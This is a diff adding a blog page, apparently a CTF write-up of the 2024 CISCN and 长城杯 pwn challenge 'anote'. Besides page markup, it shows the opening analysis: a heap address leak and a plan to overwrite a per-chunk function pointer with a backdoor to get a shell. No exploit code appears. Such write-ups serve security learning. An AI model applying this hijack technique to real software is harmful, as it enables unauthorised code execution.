@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="collectcrop">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-长城杯初赛pwn方向部分题解/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="pwn-anote32位程序，存在后门函数。   粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。     这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024ciscn&amp;长城杯初赛pwn方向部分题解">
+<meta property="og:url" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Collectcrop&#39;s Blog">
+<meta property="og:description" content="pwn-anote32位程序，存在后门函数。   粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。     这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入">
+<meta property="og:locale">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png">
+<meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png">
+<meta property="article:published_time" content="2024-12-18T14:28:40.000Z">
+<meta property="article:modified_time" content="2024-12-18T14:35:38.579Z">
+<meta property="article:author" content="collectcrop">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="ciscn">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/blog/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/blog/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2024ciscn&amp;长城杯初赛pwn方向部分题解 | Collectcrop&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/blog/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/blog/build/css/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/blog/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/blog/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/blog/build/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"collectcrop.github.io","root":"/blog/","language":"ch","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Collectcrop's Blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/collectcrop","instagram":null,"zhihu":null,"twitter":null,"email":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=2583727188&site=qq&menu=yes"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"path":"/categories/","icon":"fa-solid fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Just enjoy.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/23 15:52:11"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/blog/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/blog/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Collectcrop&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/blog/">
+                
+                Collectcrop&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/blog/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/blog/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/blog/links">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/blog/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/blog/links">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2024ciscn&amp;长城杯初赛pwn方向部分题解</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/blog/images/avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">collectcrop</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-12-18 22:28:40</span>
+        <span class="mobile">2024-12-18 22:28:40</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-12-18 22:35:38</span>
+            <span class="mobile">2024-12-18 22:35:38</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/blog/categories/wp/">wp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/blog/tags/wp/">wp</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/blog/tags/ciscn/">ciscn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/blog/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>13 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h4 id="pwn-anote"><a href="#pwn-anote" class="headerlink" title="pwn-anote"></a>pwn-anote</h4><p>32位程序，存在后门函数。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
+                      class=""
+                >
+
+<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
+                      class=""
+                >
+
+<p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
+                      class=""
+                >
+
